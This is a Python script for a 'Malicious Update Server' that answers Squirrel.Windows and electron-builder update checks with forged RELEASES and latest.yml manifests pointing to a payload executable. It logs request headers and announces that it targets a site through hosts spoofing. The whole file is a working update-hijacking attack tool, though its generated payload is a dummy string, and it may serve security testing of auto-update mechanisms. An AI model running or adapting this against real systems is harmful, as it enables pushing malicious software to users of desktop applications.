import http.server
import socketserver
import os
import datetime

PORT = 80
PAYLOAD_FILE = "fake_update.exe"

class MaliciousUpdateHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[{datetime.datetime.now()}] Incoming Request: {self.path}")
        print(f"    Headers: {self.headers}")
        
        # Log the request for analysis
        with open("update_server.log", "a") as f:
            f.write(f"[{datetime.datetime.now()}] GET {self.path}\nHEADERS:\n{self.headers}\n\n")

        # Logic to serve different update files based on request
        if "RELEASES" in self.path:
            # Simulate Squirrel.Windows RELEASES file
            response = f"SHA1_HASH {PAYLOAD_FILE} 12345678" # Simplified
            self.send_response(200)
            self.end_headers()
            self.wfile.write(response.encode())
            return
            
        elif "latest.yml" in self.path:
             # Simulate electron-builder latest.yml
            yaml_content = f"""
version: 1.0.1
files:
  - url: {PAYLOAD_FILE}
    sha512: "MnZk"
    size: 12345
path: {PAYLOAD_FILE}
sha512: "MnZk"
releaseDate: "{datetime.datetime.now().isoformat()}"
"""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(yaml_content.encode())
            return

        elif self.path.endswith(PAYLOAD_FILE):
             # Serve the actual payload
             if os.path.exists(PAYLOAD_FILE):
                 super().do_GET()
             else:
                 self.send_response(404)
                 self.end_headers()
                 self.wfile.write(b"Payload not found on server")
             return

        # Default fallthrough
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"File not found (Malicious Server Active)")

print(f"[*] Malicious Update Server listening on port {PORT}")
print(f"[*] Targeting: https://example.com (via Hosts Spoofing)")
print(f"[*] Serving payload: {PAYLOAD_FILE}")

# Create dummy payload if not exists
if not os.path.exists(PAYLOAD_FILE):
    with open(PAYLOAD_FILE, "wb") as f:
        f.write(b"This is a dummy malicious update payload.")

# Allow reuse address to prevent "Address already in use" errors
socketserver.TCPServer.allow_reuse_address = True

with socketserver.TCPServer(("", PORT), MaliciousUpdateHandler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
